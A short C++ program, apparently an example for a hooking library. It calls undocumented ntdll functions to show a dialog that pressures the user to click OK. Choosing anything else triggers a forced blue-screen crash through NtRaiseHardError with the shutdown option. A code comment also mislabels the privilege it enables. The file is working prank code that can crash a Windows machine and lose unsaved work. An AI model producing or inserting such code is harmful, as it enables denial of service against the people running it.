#define HOOKLIB_MODULE_NAME NULL
#define HOOKLIB_NO_DLL_SPOOFING
#include <hooklib.hpp>
typedef struct {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING;
int main() {
	HOOKLIB_RUNTIME_FUNCTION(LONG, __cdecl, "ntdll.dll", NtRaiseHardError, LONG Status, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
	HOOKLIB_RUNTIME_FUNCTION(LONG, __cdecl, "ntdll.dll", RtlSetProcessIsCritical, BOOLEAN NewValue, PBOOLEAN OldValue, BOOLEAN IsWinlogon);
	HOOKLIB_RUNTIME_FUNCTION(LONG, __cdecl, "ntdll.dll", RtlAdjustPrivilege, ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PULONG Enabled);
	HOOKLIB_RUNTIME_FUNCTION(void, __cdecl, "ntdll.dll", RtlInitUnicodeString, UNICODE_STRING*, PCWSTR);

	UNICODE_STRING *uTitle, *uText;
	uTitle = (UNICODE_STRING*)VirtualAlloc(NULL, sizeof(UNICODE_STRING), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	uText = (UNICODE_STRING*)VirtualAlloc(NULL, sizeof(UNICODE_STRING), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	RtlInitUnicodeString(uTitle, L"This is very important.");
	RtlInitUnicodeString(uText, L"Select [OK]. Please.");
	ULONG_PTR args[] = { (ULONG_PTR)uText, (ULONG_PTR)uTitle, MB_OKCANCEL | MB_ICONWARNING };
	ULONG resp;
	NtRaiseHardError(0x50000018, 3, 3, args, /* OptionOkCancel */ 3, &resp);
	if (resp != /* ResponseOk */ 6) {
		RtlAdjustPrivilege(19 /* SeDebugPrivilege */, TRUE, FALSE, &resp);
		NtRaiseHardError(0xDEAD9527, 0, 0, 0, /* OptionShutdownSystem */ 6, &resp);
	}
}